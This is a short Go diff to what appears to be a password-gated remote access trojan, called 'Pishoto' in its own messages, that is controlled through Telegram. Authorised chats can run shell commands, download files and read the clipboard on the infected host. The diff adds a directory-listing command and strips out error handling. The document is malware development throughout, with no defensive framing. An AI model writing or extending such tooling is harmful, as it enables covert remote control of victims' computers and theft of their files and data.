@@ -24,6 +24,8 @@ func parseCommand(chatID int64, text string) {
 		getInfo(chatID)
 	case "/cmd":
 		executeCommand(chatID, commandParts[1:])
+	case "/showdir":
+		showDir(chatID, strings.Trim(strings.Join(commandParts[1:], " "), `"'`))
 	case "/down":
 		sendFile(chatID, strings.Trim(strings.Join(commandParts[1:], " "), `"'`))
 	case "/clip":
@@ -45,11 +47,7 @@ func main() {
 	onStart()
 
 	for {
-		updates, err := GetUpdates(offset)
-		if err != nil {
-			// log.Fatalf("Error fetching updates: %v", err)
-		}
-
+		updates, _ := GetUpdates(offset)
 		for _, update := range updates.Result {
 			offset = update.UpdateID + 1
 			chatID := update.Message.Chat.ID
@@ -57,13 +55,9 @@ func main() {
 			if contains(chatIDs, chatID) {
 				parseCommand(chatID, text)
 			} else if md5Hash(text) == passMd5 {
-				// fmt.Println("Password answered in Chat ID:", chatID)
 				chatIDs = append(chatIDs, chatID)
-				responseText := "Password confirmed. Pishoto is welcoming you 🤖"
-				err := SendMessage(chatID, responseText)
-				if err != nil {
-					// log.Fatalf("Error sending message: %v", err)
-				}
+				responseText := "Password confirmed. \nPishoto is welcoming you 🤖"
+				SendMessage(chatID, responseText)
 			} else {
 				responseText := "Wrong password."
 				SendMessage(chatID, responseText)
